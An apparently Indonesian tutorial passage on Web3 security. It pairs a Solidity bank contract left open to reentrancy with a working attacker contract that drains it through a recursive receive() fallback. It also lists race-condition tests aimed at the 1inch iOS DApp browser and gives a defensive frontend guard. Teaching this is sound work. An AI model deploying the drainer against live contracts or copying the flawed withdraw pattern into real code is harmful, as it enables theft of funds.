Contoh Kontrak Korban (Vulnerable)

// VulnerableBank.sol
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // ❌ Reentrancy vulnerability
    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success);
        balances[msg.sender] = 0; // state update AFTER external call
    }
}

Kontrak Penyerang

// Attacker.sol
contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}

🌐 Celah Logika API / Backend Web3

Menguji bagaimana DApp (khususnya 1inch di DApp Browser iOS) memvalidasi respons dari wallet.

  • Apakah ada race condition ketika user membatalkan transaksi berulang kali?
  • Bagaimana penanganan sesi (session) jika wallet mengembalikan null / error setelah user reject?
  • Apakah frontend masih menganggap transaksi “pending” meskipun user sudah cancel di wallet?
  • Apakah backend / indexer mempercayai event yang belum final (reorg risk)?
Di iOS DApp Browser (1inch Wallet), WebView sering memakai window.ethereum atau WalletConnect. Uji dengan:
• Reject transaksi berkali-kali dengan cepat
• Ganti jaringan di tengah request
• Kill app saat signature request muncul

Contoh Race Condition Check (Frontend)

let isRequesting = false;

async function safeSendTransaction(tx) {
  if (isRequesting) {
    console.warn("Race: request already in flight");
    return;
  }
  isRequesting = true;
  try {
    const hash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [tx]
    });
    return hash;
  } catch (err) {
    // User rejected atau error lain
    console.log("User rejected / error:", err.code);
  } finally {
    isRequesting = false; // penting!
  }
}
